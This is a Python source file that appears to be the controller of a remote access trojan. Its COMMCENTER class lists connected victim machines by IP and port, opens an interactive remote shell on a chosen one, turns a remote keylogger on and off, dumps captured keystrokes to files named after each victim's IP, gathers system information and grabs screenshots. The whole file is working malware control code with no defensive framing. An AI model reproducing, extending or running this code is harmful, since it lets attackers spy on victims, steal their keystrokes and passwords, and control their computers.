import os
import subprocess
import sys
from datetime import datetime

import tabulate

from main.common.output import pull


class COMMCENTER:

    CLIENTS = []
    COUNTER = 0
    CURRENT = ()    #### Current Target Client ####
    KEYLOGS = []

    def c_help(self, vals):
        if len(vals) > 1:
            if vals[1] == "sessions":
                pull.help_c_sessions()
            elif vals[1] == "connect":
                pull.help_c_connect()
            elif vals[1] == "disconnect":
                pull.help_c_disconnect()
            elif vals[1] == "clear":
                pull.help_c_clear()
            elif vals[1] == "shell":
                pull.help_c_shell()
            elif vals[1] == "keylogger":
                pull.help_c_keylogger()
            elif vals[1] == "sysinfo":
                pull.help_c_sysinfo()
            elif vals[1] == "screenshot":
                pull.help_c_screenshot()
        else:
            if self.CURRENT:
                pull.help_c_current()
            else:
                pull.help_c_general()

    def get_valid(self, _id):
        for client in self.CLIENTS:
            if client[0] == int(_id):
                return client

        return False

    def c_ping(self, _id):
        return

    def c_connect(self, args):
        if len(args) == 2:
            tgt = self.get_valid(args[1])
            if tgt:
                self.CURRENT = tgt
            else:
                sys.stdout.write("\n")
                pull.error("No client is associated with that ID!")
                sys.stdout.write("\n")
        else:
            sys.stdout.write("\n")
            pull.error("Invalid Syntax!")
            sys.stdout.write("\n")

    def c_disconnect(self):
        self.CURRENT = ()

    def c_sessions(self):
        headers = (pull.BOLD + 'ID' + pull.END, pull.BOLD + 'IP Address' + pull.END, pull.BOLD + 'Incoming Port' + pull.END, pull.BOLD + 'Status' + pull.END)
        lister = []

        for client in self.CLIENTS:
            toappend = []
            toappend.append(pull.RED + str(client[0]) + pull.END)
            toappend.append(pull.DARKCYAN + client[1].ip + pull.END)
            toappend.append(pull.BLUE + str(client[1].port) + pull.END)
            toappend.append(pull.GREEN + client[1].STATUS + pull.END)
            lister.append(toappend)

        sys.stdout.write("\n")
        print(tabulate.tabulate(lister, headers=headers))
        sys.stdout.write("\n")

    def c_shell(self):
        result = ""
        if self.CURRENT:
            sys.stdout.write("\n")
            while True:
                val = input("# ")
                val = "shell:" + val.rstrip(" ").lstrip(" ")

                if val:
                    if val != "shell:exit":
                        self.CURRENT[1].send_data(val)
                        result = self.CURRENT[1].recv_data()
                        if result.strip(" "):
                          print(result)
                    else:
                        break
        else:
            sys.stdout.write("\n")
            pull.error("You need to connect before execute this command!")
            sys.stdout.write("\n")

    def c_clear(self):
        subprocess.call(["clear"], shell=True)

    def c_keylogger(self, args):
        if self.CURRENT:
            if len(args) == 2:
                if args[1] == "status":
                    return
                elif args[1] == "on":
                    self.CURRENT[1].send_data("keylogger:on")
                    result = self.CURRENT[1].recv_data()
                    if result.strip(" "):
                        print(result)

                elif args[1] == "off":
                    self.CURRENT[1].send_data("keylogger:off")
                    result = self.CURRENT[1].recv_data()
                    if result.strip(" "):
                        print(result)

                elif args[1] == "dump":
                    self.CURRENT[1].send_data("keylogger:dump")
                    result = self.CURRENT[1].recv_data()
                    dirname = os.path.dirname(__file__)
                    dirname = os.path.join( dirname, 'keylogs' )
                    if not os.path.isdir(dirname):
                        os.mkdir(dirname)
                    dirname = os.path.join( dirname, '%s' % (self.CURRENT[1].ip) )
                    if not os.path.isdir(dirname):
                        os.mkdir(dirname)
                    fullpath = os.path.join( dirname, datetime.now().strftime("%d-%m-%Y %H:%M:%S.txt") )
                    fl = open( fullpath, 'w' )
                    fl.write( result )
                    fl.close()
                    pull.print("Dumped: [" + pull.GREEN + fullpath + pull.END + "]")

                else:
                    pull.error("Invalid Syntax!")
            else:
                pull.error("Invalid Syntax!")
        else:
            pull.error("You need to connect before execute this command!")

    def c_sysinfo(self):
        if self.CURRENT:
            self.CURRENT[1].send_data("sysinfo:")
            result = self.CURRENT[1].recv_data()
            if result.strip(" "):
                print(result)
        else:
            pull.error("You need to connect before execute this command!")

    def c_screenshot(self):
        if self.CURRENT:
            self.CURRENT[1].send_data("screenshot:")
            result = self.CURRENT[1].recv_data()
            dirname = os.path.dirname(__file__)
            dirname = os.path.join( dirname, 'screenshots' )
            if not os.path.isdir(dirname):
                os.mkdir(dirname)
            dirname = os.path.join( dirname, '%s' % (self.CURRENT[1].ip) )
            if not os.path.isdir(dirname):
                os.mkdir(dirname)
            fullpath = os.path.join( dirname, datetime.now().strftime("%d-%m-%Y %H:%M:%S.png") )
            fl = open( fullpath, 'wb' )
            fl.write( result )
            fl.close()
            pull.print("Saved: [" + pull.DARKCYAN + fullpath + pull.END + "]")
        else:
            pull.error("You need to connect before execute this command!")

    def c_exit(self):
        sys.stdout.write("\n")
        pull.exit("See Ya!\n")